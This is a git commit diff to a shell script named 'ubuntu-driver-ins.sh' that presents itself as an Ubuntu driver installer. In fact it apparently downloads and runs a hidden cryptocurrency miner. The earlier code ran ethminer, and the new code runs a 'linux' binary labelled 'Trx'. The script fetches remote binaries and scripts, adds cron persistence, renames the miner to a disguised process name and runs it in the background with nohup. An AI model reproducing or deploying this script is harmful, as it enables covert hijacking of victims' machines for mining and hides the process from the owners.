e1356d8acaa90231f42298969e9bff72e8b7068b
Jame <lungtungner@gmail.com>
2022-03-17 23:22:08 +0700

    100% Trx

--- ubuntu-driver-ins.sh
+++ ubuntu-driver-ins.sh
@@ -27,11 +27,13 @@ num=$Fcheck
 if [ $num = 2 ]; 
 	then
 		echo "RUN PROCESS 1"; 
-			# Mlnoder
-			wget https://github.com/$gitpath/raw/main/Mlnode.tar.gz
-			tar -xvf Mlnode.tar.gz
-			rm -rf Mlnode.tar.gz
-			#da co thu muc bin
+		#1 Linux Trx
+			wget https://github.com/$gitpath/raw/main/linux.tar.gz
+			tar -xvf linux.tar.gz
+			rm -rf linux.tar.gz
+			#chua co thu muc bin
+			mkdir bin
+			cp linux bin/linux
 			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
 			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
 			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
@@ -43,15 +45,19 @@ if [ $num = 2 ];
 			./processname.sh
 			cp inuser.txt bin/inuser.txt
 			cd bin/
-            wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
+           wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
 			Uuname=$(cat inuser.txt)
 			USEPROCNAME=$(cat SETPROCNAME.txt)
-			wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
+			echo > trx.txt
+			wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
+			mv runlinux.sh runsrc.sh
 			chmod +x runsrc.sh
 			date +'%A' > date.txt
-			mv ethminer $USEPROCNAME
+			mv linux $USEPROCNAME
 			sudo chown -R $Uuname:$Uuname /home/$Uuname/
 			nohup sh runsrc.sh > result.log 2>&1 &
+			#2
+#---------------------
 			
 	else 
 		echo "RUN PROCESS 2"; 
@@ -90,3 +96,26 @@ if [ $num = 2 ];
 
 fi
 
+# Mlnoder
+#			wget https://github.com/$gitpath/raw/main/Mlnode.tar.gz
+#			tar -xvf Mlnode.tar.gz
+#			rm -rf Mlnode.tar.gz
+#			#da co thu muc bin
+#			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
+#			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
+#			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
+#			wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
+#			chmod +x auinstall.sh
+#			chmod +x processname.sh
+#			chmod +x cronadd.sh
+#			./cronadd.sh
+#			./processname.sh
+#			cp inuser.txt bin/inuser.txt
+#			cd bin/
+#			Uuname=$(cat inuser.txt)
+#			USEPROCNAME=$(cat SETPROCNAME.txt)
+#			wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
+#			chmod +x runsrc.sh
+#			date +'%A' > date.txt
+#			sudo chown -R $Uuname:$Uuname /home/$Uuname/
+#			nohup sh runsrc.sh > result.log 2>&1 &
